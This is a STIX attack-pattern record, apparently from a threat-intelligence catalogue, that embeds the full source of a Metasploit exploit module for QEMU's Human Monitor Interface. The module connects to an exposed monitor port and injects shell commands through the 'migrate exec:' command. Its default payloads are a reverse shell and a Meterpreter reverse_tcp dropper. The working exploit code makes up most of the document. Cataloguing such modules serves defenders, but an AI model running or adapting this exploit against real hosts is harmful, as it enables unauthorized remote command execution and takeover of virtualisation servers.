{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd3ede7a-1050-43d3-9fb1-fb57f6600bc6",
    "created": "2024-08-14T17:06:33.356919Z",
    "modified": "2024-08-14T17:06:33.356924Z",
    "name": "\"QEMU Monitor HMP migrate Command Execution\"",
    "description": " This module uses QEMU's Monitor Human Monitor Interface (HMP) TCP server to execute system commands using the `migrate` command.  This module has been tested successfully on QEMU version 6.2.0 on Ubuntu 20.04.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/qemu_monitor_hmp_migrate_cmd_exec.rb",
            "external_id": "qemu_monitor_hmp_migrate_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://wiki.qemu.org/ToDo/HMP"
        },
        {
            "source_name": "reference",
            "url": "https://www.qemu.org/docs/master/system/monitor.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.qemu.org/docs/master/system/security.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.linux-kvm.org/page/Migration"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"QEMU Monitor HMP 'migrate' Command Execution\",\n        'Description' => %q{\n          This module uses QEMU's Monitor Human Monitor Interface (HMP)\n          TCP server to execute system commands using the `migrate` command.\n\n          This module has been tested successfully on QEMU version 6.2.0\n          on Ubuntu 20.04.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['bcoles'],\n        'References' => [\n          ['URL', 'https://wiki.qemu.org/ToDo/HMP'],\n          ['URL', 'https://www.qemu.org/docs/master/system/monitor.html'],\n          ['URL', 'https://www.qemu.org/docs/master/system/security.html'],\n          ['URL', 'https://www.linux-kvm.org/page/Migration'],\n        ],\n        'Arch' => [ ARCH_CMD, ARCH_AARCH64, ARCH_ARMLE, ARCH_X86, ARCH_X64 ],\n        'Platform' => %w[unix linux],\n        'Payload' => {\n          'DisableNops' => true,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x22\",\n          'Space' => 1010\n        },\n        'Targets' => [\n          [\n            'Unix (Command)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },\n              'Type' => :unix_cmd\n            }\n          ],\n          [\n            'Linux (Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ ARCH_AARCH64, ARCH_ARMLE, ARCH_X86, ARCH_X64 ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',\n                'PrependFork' => true,\n                'MeterpreterTryToFork' => true\n              },\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        },\n        'Privileged' => false,\n        'DisclosureDate' => '2011-12-02'\n      )\n    )\n  end\n\n  def read_until_prompt\n    ::Timeout.timeout(10) do\n      loop do\n        res = sock.get_once\n        break if res.nil?\n        break if res.to_s.include?('(qemu)')\n      end\n    end\n  end\n\n  def check\n    connect\n    banner = sock.get_once.to_s\n    disconnect\n\n    unless banner.include?('QEMU') && banner.include?('monitor')\n      return CheckCode::Safe('Service is not QEMU monitor HMP.')\n    end\n\n    CheckCode::Appears('QEMU monitor HMP service is running.')\n  end\n\n  def execute_command(cmd, _opts = {})\n    cmd = cmd.gsub('\\\\', '\\\\\\\\\\\\')\n    vprint_status(\"Executing command: #{cmd}\")\n    sock.put(\"migrate -d \\\"exec:#{cmd}\\\"\\n\")\n    read_until_prompt\n  end\n\n  def exploit\n    connect\n    read_until_prompt\n\n    print_status \"Sending payload (#{payload.encoded.length} bytes) ...\"\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(linemax: 1010, background: true)\n    end\n  ensure\n    disconnect unless sock.nil?\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-02",
    "x_mitre_platforms": [
        "linux'"
    ]
}